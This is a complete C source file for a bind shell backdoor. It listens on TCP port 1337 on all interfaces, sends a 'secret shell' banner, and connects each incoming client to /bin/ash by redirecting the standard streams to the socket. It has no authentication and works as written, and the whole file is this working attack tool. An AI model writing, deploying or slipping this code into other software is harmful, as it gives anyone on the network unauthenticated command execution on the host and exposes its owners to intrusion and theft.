#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <stdbool.h>
#include <fcntl.h>
#include <string.h>

#define handle_error(msg, rc) do{ perror(msg); result=rc; goto l_cleanup; } while (0)
#define arr_length(arr) sizeof(arr) / sizeof(arr[0])

#define LISTENING_PORT (1337)
#define SHELL_PATH ("/bin/ash")
#define WELCOME_BANNER ("Welcome to a secret shell :)\n")

#define MAX_LISTEN (5)
#define FORK_FAILED (-1)
#define FORK_CHILD_PROCESS (0)

typedef enum return_code_e{
    RC_UNINITIAILIZED = -1,
    RC_SUCCESS = 0,
    RC_INIT_SERVER_SOCKET_BAD_PARAMS,
    RC_SOCKET_INIT_FAILED,
    RC_SOCKET_BIND_FAILED,
    RC_SOCKET_LISTEN_FAILED,
    RC_SOCKET_ACCEPT_FAILED,
    RC_FORK_FAILED,
    RC_EXEC_FAILED,
    RC_DUP2_FAILED,
    RC_FCNTL_FAILED,
} return_code_t;

return_code_t init_server_socket(int32_t server_port, int32_t *server_socket_ptr)
{
    return_code_t result = RC_UNINITIAILIZED;
    int32_t server_socket = -1;
    struct sockaddr_in server_address = {0};
    struct in_addr server_inteface = {0};
    int temp_result = -1;

    if (NULL == server_socket_ptr || 0 == server_port){
        result = RC_INIT_SERVER_SOCKET_BAD_PARAMS;
        goto l_cleanup;
    }

    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (-1 == server_socket){
        handle_error("Socket failed", RC_SOCKET_INIT_FAILED);
    }

    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(server_port);
    server_inteface.s_addr = INADDR_ANY;
    server_address.sin_addr = server_inteface;
    temp_result = bind(server_socket, (struct sockaddr *)&server_address, sizeof(server_address));
    if (-1 == temp_result){
        handle_error("Bind failed", RC_SOCKET_BIND_FAILED);
    }

    temp_result = listen(server_socket, MAX_LISTEN);
    if (-1 == temp_result){
        handle_error("Listen failed", RC_SOCKET_LISTEN_FAILED);
    }

    *server_socket_ptr = server_socket;

    result = RC_SUCCESS;
l_cleanup:
    return result;
}

return_code_t start_shell(int32_t client_socket)
{
    return_code_t result = RC_UNINITIAILIZED;
    int dup_result = -1;
    int32_t shell_fds[] = {STDIN_FILENO, STDOUT_FILENO, STDERR_FILENO};

    // Set the shell's standards streams to use the client socket file descriptor.
    for (uint8_t i = 0; i < arr_length(shell_fds); ++i){
        dup_result = dup2(client_socket, shell_fds[i]);
        if (-1 == dup_result){
            handle_error("Dup2 failed", RC_DUP2_FAILED);
        }
    }

    execl(SHELL_PATH, SHELL_PATH, (char *)NULL);
    // exec shouldn't return unless an error has occured.
    handle_error("Execl failed", RC_EXEC_FAILED);

l_cleanup:
    return result;
}

return_code_t handle_new_connection(int32_t server_socket)
{
    return_code_t result = RC_UNINITIAILIZED;
    struct sockaddr_in client_address = {0};
    socklen_t client_address_size = 0;
    int32_t client_socket = -1;
    pid_t fork_result = -1;
    uint16_t client_port = 0;

    client_address_size = sizeof(client_address);
    client_socket = accept(server_socket, (struct sockaddr *)&client_address, &client_address_size);
    if (-1 == client_socket){
        handle_error("Accept failed", RC_SOCKET_ACCEPT_FAILED);
    }
    client_port = ntohs(client_address.sin_port);
    printf("New shell connection:, IP: %s, port: %d\n", inet_ntoa(client_address.sin_addr), client_port);

    send(client_socket, WELCOME_BANNER, strlen(WELCOME_BANNER), 0);

    fork_result = fork();
    switch (fork_result)
    {
        case FORK_FAILED:
            result = RC_FORK_FAILED;
            goto l_cleanup;

        // Child process.
        case FORK_CHILD_PROCESS:
            result = start_shell(client_socket);
            break;
    
        // Parent process.
        default:
            break;
    };

    result = RC_SUCCESS;
l_cleanup:
    if (-1 != client_socket){
        (void)close(client_socket);
        client_socket = -1;
    }
    return result;
}


int main(void)
{
    return_code_t result = RC_UNINITIAILIZED;
    int32_t server_socket = -1;
    int32_t temp_result = -1;

    result = init_server_socket(LISTENING_PORT, &server_socket);
    if (RC_SUCCESS != result){
        goto l_cleanup;
    }

    // We don't want to pass the server_socket's fd to the shell process.
    temp_result = fcntl(server_socket, F_SETFD, FD_CLOEXEC);
    if (-1 == temp_result){
        handle_error("Fcntl failed", RC_FCNTL_FAILED);
    }

    printf("Started to listen for connections on port: %d\n", LISTENING_PORT);
    while (true){
        result = handle_new_connection(server_socket);
        if (RC_SUCCESS != result){
            break;
        }
    }

    printf("Stops listening for new connections.\n");
l_cleanup:
    if (-1 != server_socket){
        (void)close(server_socket);
    }
    
    return (int)result;
}